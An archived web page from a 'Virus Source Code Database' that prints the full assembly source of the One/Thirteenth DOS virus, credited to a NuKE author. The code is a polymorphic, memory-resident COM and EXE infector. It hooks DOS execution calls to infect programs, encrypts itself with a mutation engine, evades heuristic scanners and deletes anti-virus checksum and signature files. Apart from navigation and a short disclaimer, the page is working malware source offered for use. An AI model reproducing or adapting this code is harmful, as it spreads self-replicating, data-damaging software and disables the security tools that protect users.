<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: one-13_asm</title>
<meta name="KEYWORDS" content="one-13.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for one-13.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="oblit_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/oblit_pas.php">oblit_pas</a><br>
<a href="odst1028_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/odst1028_pas.php">odst1028_pas</a><br>
<a href="offspr05_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/offspr05_asm.php">offspr05_asm</a><br>
<a href="offspr07_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/offspr07_asm.php">offspr07_asm</a><br>
<a href="offspr81_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/offspr81_asm.php">offspr81_asm</a><br>
<a href="offspr82_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/offspr82_asm.php">offspr82_asm</a><br>
<a href="offspr89_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/offspr89_asm.php">offspr89_asm</a><br>
<a href="olo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/olo_asm.php">olo_asm</a><br>
<a href="omega_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/omega_asm.php">omega_asm</a><br>
<a href="one-13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/one-13_asm.php">one-13_asm</a><br>
<a href="onkelz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/onkelz_asm.php">onkelz_asm</a><br>
<a href="ontar512_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ontar512_asm.php">ontar512_asm</a><br>
<a href="ontario0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ontario0_asm.php">ontario0_asm</a><br>
<a href="ontario3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ontario3_asm.php">ontario3_asm</a><br>
<a href="ontario_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ontario_asm.php">ontario_asm</a><br>
<a href="orgasm_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/orgasm_pas.php">orgasm_pas</a><br>
<a href="oropax___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/oropax___asm.php">oropax___asm</a><br>
<a href="oropax__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/oropax__asm.php">oropax__asm</a><br>
<a href="oropax_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/oropax_asm.php">oropax_asm</a><br>
<a href="orsam1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/orsam1_asm.php">orsam1_asm</a><br>
<a href="orsam2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/orsam2_asm.php">orsam2_asm</a><br>
<a href="orsam3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/orsam3_asm.php">orsam3_asm</a><br>
<a href="orsam__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/orsam__asm.php">orsam__asm</a><br>
<a href="orsam_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/orsam_asm.php">orsam_asm</a><br>
<a href="osp-07s_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/osp-07s_asm.php">osp-07s_asm</a><br>
<a href="ospring__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ospring__asm.php">ospring__asm</a><br>
<a href="ospring_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ospring_asm.php">ospring_asm</a><br>
<a href="otto_415_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/otto_415_asm.php">otto_415_asm</a><br>
<a href="otto-415_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/otto-415_asm.php">otto-415_asm</a><br>
<a href="outland_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/outland_asm.php">outland_asm</a><br>
<a href="ow_27_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_27_asm.php">ow_27_asm</a><br>
<a href="ow_27b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_27b_asm.php">ow_27b_asm</a><br>
<a href="ow_28_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_28_asm.php">ow_28_asm</a><br>
<a href="ow_28b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_28b_asm.php">ow_28b_asm</a><br>
<a href="ow_30_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_30_asm.php">ow_30_asm</a><br>
<a href="ow-30_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow-30_asm.php">ow-30_asm</a><br>
<a href="ow_32_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_32_asm.php">ow_32_asm</a><br>
<a href="ow_37_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_37_asm.php">ow_37_asm</a><br>
<a href="ow_40_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_40_asm.php">ow_40_asm</a><br>
<a href="ow_42_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_42_asm.php">ow_42_asm</a><br>
<a href="ow-42_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow-42_asm.php">ow-42_asm</a><br>
<a href="ow_42b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_42b_asm.php">ow_42b_asm</a><br>
<a href="ow_44_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_44_asm.php">ow_44_asm</a><br>
<a href="ow_64_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_64_asm.php">ow_64_asm</a><br>
<a href="ow_66_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_66_asm.php">ow_66_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>


; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-Ä
; One/Thirteenth {v0.4} - coded by ûirogen [NuKE] on 02-23-95
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-Ä
;    -Polymorphic, Memory-Resident, Parastic COM & EXE Infector
;    -Deletes Invircible Signature Files from disk no matter what name
;     they are under.
;    -Also deletes ANTI-VIR.DAT, CHKLIST.MS, and CHKLIST.CPS.
;    -Avoids Infecting InVircible Bait Files
;    -Disables VSAFE/VWATCH if in memory
;    -Avoids new format EXEs
;    -Installs it's own INT 24h
;    -EXE Id is: Checksum Not 0
;    -COM Id is: Fourth byte 0
;    -Resident Check: VSAFE/VWATCH API , ret:SI=0
;
;    Polymorphism: ûiCE v0.4á /w JMPS ON & ANTI-TBSCAN CODE ON
;
;
;
cseg	    segment
	    assume  cs: cseg, ds: cseg, es: cseg, ss: cseg

signal	    equ	    0FA01h		    ; AX=signal/INT 21h/installation chk
vsafe_word  equ	    5945h		    ; magic word for VSAFE/VWATCH API
buf_size    equ     250
vice_size   equ     2009+buf_size
virus_size  equ	    (offset vend-offset start)+VICE_SIZE

extrn	    _vice:  near

org	    0h
start:
	    int	    3
	    call    nx			    ; get relative offset
nx:	    mov	    si,sp		    ; no-heuristic
	    sub	    word ptr ss: [si],offset nx
	    mov	    bp,word ptr ss: [si]
	    add	    sp,2

	    push    ds es		    ; save segments for EXE
	    inc	    si
	    mov	    ax,1000
	    add	    ax,signal-1000	    ; no heuristics m0n
	    mov	    dx,vsafe_word
	    int	    21h
	    or	    si,si
	    jz	    no_install		    ; if carry then we are

	    mov	    ax,ds		    ; PSP segment
	    dec	    ax			    ; mcb below PSP m0n
	    mov	    ds,ax		    ; DS=MCB seg
	    mov	    al,'Z'		    ; no heuristics
	    cmp	    byte ptr ds: [0],al	    ; Is this the last MCB in chain?
	    jnz	    no_install
	    sub	    word ptr ds: [3],((virus_size+1023)/1024)*64*2 ; alloc MCB
	    sub	    word ptr ds: [12h],((virus_size+1023)/1024)*64*2 ; alloc PSP
	    mov	    es,word ptr ds: [12h]   ; get high mem seg
	    push    cs
	    pop	    ds
	    mov	    si,bp
	    mov	    cx,virus_size/2+1
	    xor	    di,di
	    rep	    movsw		    ; copy code to new seg
	    xor	    ax,ax
	    mov	    ds,ax		    ; null ds
	    push    ds
	    lds	    ax,ds: [21h*4]	    ; get 21h vector
	    mov	    es: word ptr old21+2,ds ; save S:O
	    mov	    es: word ptr old21,ax
	    pop	    ds
	    mov	    ds: [21h*4+2],es	    ; new int 21h seg
	    mov	    ds: [21h*4],offset new21 ; new offset
	    sub	    byte ptr ds: [413h],((virus_size+1023)*2)/1024 ;-totalmem

no_install:

	    pop	    es ds		    ; restore ES DS
            xor     ax,ax                   ; null regs
            xor     bx,bx
            xor     dx,dx
            cmp     cs: is_exe[bp],1
	    jz	    exe_return

	    lea	    si,org_bytes[bp]	    ; com return
	    mov	    di,0100h		    ; -restore first 4 bytes
	    mov	    cx,2
	    rep	    movsw

            mov     cx,100h                 ; jump back to 100h
            push    cx
_ret:	    ret

exe_return:
            mov     cx,ds                   ; calc. real CS
	    add	    cx,10h
	    add	    word ptr cs: [exe_jump+2+bp],cx
	    int	    3			    ; fix prefetch
            db      0eah
exe_jump    dd	    0
is_exe	    db	    0

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Main Infection Routine
;
infect_file:

	    push    dx
	    pop	    si

	    push    ds
	    xor	    ax,ax		    ; null ES
	    mov	    es,ax
	    lds	    ax,es: [24h*4]	    ; get INT 24h vector
	    mov	    cs: old_24_off,ax	    ; save it
	    mov	    cs: old_24_seg,ds
	    mov	    es: [24h*4+2],cs	    ; install our handler
	    mov	    es: [24h*4],offset new_24
	    pop	    ds
	    push    es			    ; we'll need it later
	    push    cs
	    pop	    es

	    mov	    ax,4300h		    ; get phile attribute
	    int	    21h
	    mov	    ax,4301h		    ; null attribs
	    push    ax cx		    ; save AX-call/CX-attrib
	    xor	    cx,cx
	    int	    21h

	    mov	    ax,3d02h		    ; open the file
	    int	    21h
	    jc	    dont_do

	    mov	    bx,ax		    ; get handle

	    push    cs
	    pop	    ds

	    mov	    ah,3fh		    ; Read first bytes of file
	    mov	    cx,20h
	    lea	    dx,org_bytes
	    int	    21h

	    call    kill_anti_virus	    ; kill validation filez

	    cmp	    byte ptr org_bytes,'M'
	    jz	    do_exe
            cmp     byte ptr org_bytes,90h  ; InVircible bait?
            jz      close
            cmp     byte ptr org_bytes+3,0
	    jz	    close

	    mov	    is_exe,0

	    mov	    ax,5700h		    ; get time/date
	    int	    21h
	    push    cx dx

	    call    offset_end
	    push    ax			    ; AX=end of file

	    lea	    si,start		    ; DS:SI=start of code to encrypt
	    mov	    di,virus_size	    ; ES:DI=address for decryptor/
	    push    di			    ;       encrypted code. (at heap)
	    mov	    cx,virus_size	    ; CX=virus size
	    mov	    dx,ax		    ; DX=EOF offset
	    add	    dx,100h		    ; DX=offset decryptor will run from
	    mov	    al,00001111b	    ; jmps,anti-tbscan, garbage, no CS:
	    call    _vice		    ; call engine!

	    pop	    dx
	    mov	    ah,40h
	    int	    21h

	    call    offset_zero
	    pop	    ax			    ; restore COM file size
	    sub	    ax,3		    ; calculate jmp offset
	    mov	    word ptr new_jmp+1,ax

	    lea	    dx,new_jmp
	    mov	    cx,4
	    mov	    ah,40h
	    int	    21h

	    pop	    dx cx		    ; pop date/time
	    mov	    ax,5701h		    ; restore the mother fuckers
	    int	    21h

close:

	    pop	    cx ax		    ; restore attrib
	    int	    21h

	    mov	    ah,3eh
	    int	    21h

dont_do:
	    pop	    es			    ; ES=0
	    lds	    ax,dword ptr old_24_off ; restore shitty DOS error handler
	    mov	    es: [24h*4],ax
	    mov	    es: [24h*4+2],ds

	    ret

do_exe:

	    cmp	    word ptr exe_header[12h],0 ; is checksum (in hdr) 0?
	    jnz	    close
	    cmp	    byte ptr exe_header[18h],52h ; pklite'd?
	    jz	    exe_ok
	    cmp	    byte ptr exe_header[18h],40h ; don't infect new format exe
	    jge	    close
exe_ok:
	    push    bx

	    mov	    ah,2ch		    ; grab a random number
	    int	    21h
	    mov	    word ptr exe_header[12h],dx ; mark that it's us
	    mov	    is_exe,1

	    les	    ax,dword ptr exe_header+14h ; Save old entry point
	    mov	    word ptr ds: exe_jump, ax
	    mov	    word ptr ds: exe_jump+2, es

	    push    cs
	    pop	    es

	    call    offset_end

	    push    dx ax		    ; save file size DX:AX

	    mov	    bx, word ptr exe_header+8h ; calc. new entry point
	    mov	    cl,4		    ; *16
	    shl	    bx,cl		    ;  ^by shifting one byte
	    sub	    ax,bx		    ; get actual file size-header
	    sbb	    dx,0
	    mov	    cx,10h		    ; divide AX/CX rDX
	    div	    cx

	    mov	    word ptr exe_header+14h,dx
	    mov	    word ptr exe_header+16h,ax
	    mov	    rel_off,dx

	    pop	    ax			    ; AX:DX file size
	    pop	    dx
	    pop	    bx

	    mov	    cx,virus_size+10h	    ; calc. new size
	    adc	    ax,cx

	    mov	    cl,9		    ; calc new alloc (512)
	    push    ax
	    shr	    ax,cl
	    ror	    dx,cl
	    stc
	    adc	    dx,ax
	    pop	    ax			    ; ax=size+virus
	    and	    ah,1

	    mov	    word ptr exe_header+4h,dx
	    mov	    word ptr exe_header+2h,ax

	    lea	    si,start		    ; DS:SI=start of code to encrypt
	    mov	    di,virus_size	    ; ES:DI=address for decryptor and
	    push    di			    ;       encrypted code (at heap)
	    mov	    cx,virus_size	    ; CX=virus size
	    mov	    dx,rel_off		    ; DX=offset decryptor will run from
	    mov	    al,00001110b	    ; jmps,anti-tbscan,garbage, use CS:
	    call    _vice		    ; call engine!

	    pop	    dx
	    mov	    ah,40h
	    int	    21h

	    call    offset_zero

	    mov	    cx,18h		    ; write fiXed header
	    lea	    dx,exe_header
	    mov	    ah,40h
	    int	    21h

	    jmp	    close

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; set file ptr

offset_zero: 	    			    ; self explanitory
	    xor	    al,al
	    jmp	    set_fp
offset_end:
	    mov	    al,02h
set_fp:
	    mov	    ah,42h
	    xor	    cx,cx
	    xor	    dx,dx
	    int	    21h
	    ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Kill ANTI-VIR.DAT, CHKLIST.MS, CHKLIST.CPS, and Invircible's signature files
;
kill_anti_virus:
	    push    bx
	    mov	    ah,1ah		    ; set DTA
	    lea	    dx,ff_info
	    int	    21h
	    mov	    cx,16h		    ; include all attribs
	    lea	    dx,inv_spec
	    mov	    ah,4eh
	    int	    21h			    ; findfirst
	    jnc	    inv_loop
	    jmp	    inv_done
inv_loop:
            lea     si,f_name
            push    si
            mov     dx,si
	    cmp	    word ptr [si+4],'V-'    ; ANTI-VIR.DAT?
	    jz	    is_anti
	    cmp	    word ptr [si+8],'SM'    ; CHKLIST.MS?
	    jz	    is_anti
	    cmp	    word ptr [si+8],'PC'    ; CHKLIST.CPS?
	    jz	    is_anti
            cmp     f_sizeh,0               ; high word set?
            jnz     findnext
            cmp     f_sizel,10000           ; > 10000 bytes?
            jg      findnext
            mov     ax,3d00h
	    int	    21h
	    jc	    findnext
	    xchg    ax,bx
	    mov	    ah,3fh
            mov     cl,2
	    lea	    dx,inv_word
	    int	    21h
	    mov	    ah,3eh
	    int	    21h
            mov     ax,word ptr inv_word
            mov     cl,4
            lea     si,false_struct
test_false:                                 ; test for false positives
            cmp     ax,[si]
            jz      findnext
            inc     si
            inc     si
            loop    test_false

            xor     al,ah                   ; xor first byte by second
            lea     si,iv_struct
            mov     cl,6
test_iv:                                    ; test if invircible
            cmp     al,[si]
            jz      is_anti
            inc     si
            loop    test_iv
            jmp     findnext
is_anti:
	    mov	    ax,4301h		    ; reset attribs
	    xor	    cx,cx
	    int	    21h
	    mov	    ah,41h
	    lea	    dx,f_name
	    int	    21h
findnext:
	    mov	    al,0		    ; null out filename
            pop     di                      ; di-> fname
            mov     cl,13
	    rep	    stosb
	    mov	    ah,4fh
	    int	    21h
	    jc	    inv_done
	    jmp	    inv_loop
inv_done:
	    pop	    bx
	    ret

inv_word     dw      0
inv_spec     db      '*.*',0
iv_struct    db      5Fh,1Bh,0C4h,17h,3Dh,8Ah    ; Inv Positives
false_struct dw      'ZM'                        ; EXE Header
             dw      'KP'                        ; PKZIP archive
             dw      0EA60h                      ; ARJ archive
             dw      'ER'                        ; REM in batch files
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; new 21h

new21:

	    pushf
	    cmp	    ax,signal		    ; be it us?
	    jnz	    nchk		    ; richtig..
	    cmp	    dx,vsafe_word
	    jnz	    nchk
	    xor	    si,si
	    mov	    di,4559h
	    jmp	    jmp_org
nchk:	    cmp	    ax,4b00h		    ; execute phile?
	    jnz	    jmp_org

	    push    ax bx cx di dx si ds es
	    call    infect_file
	    pop	    es ds si dx di cx bx ax

jmp_org:
	    popf
	    db	    0eah		    ; jump far XXXX:XXXX
	    old21   dd 0

new_24:	    	    			    ; critical error handler
	    mov	    al,3		    ; prompts suck, return fail
	    iret


credits     db      'One/Thirteenth, coded by ûirogen [NuKE]'
new_jmp	    db	    0E9h,0,0,0		    ; jmp XXXX,0
rel_off	    dw	    0
exe_header:
org_bytes   db	    0CDh,20h,0,0	    ; original COM bytes | exe hdr
vend:	    	    			    ; end of virus on disk .. heap
            db      16h dup(0)              ; remaining exe header space
old_24_off  dw	    0			    ; old int24h vector
old_24_seg  dw	    0
ff_info     db      26 dup(0)
f_sizel     dw      0
f_sizeh     dw      0
f_name      db      13 dup(0)
cseg	    ends
	    end	    start


</textarea></td></tr></table></body></html>
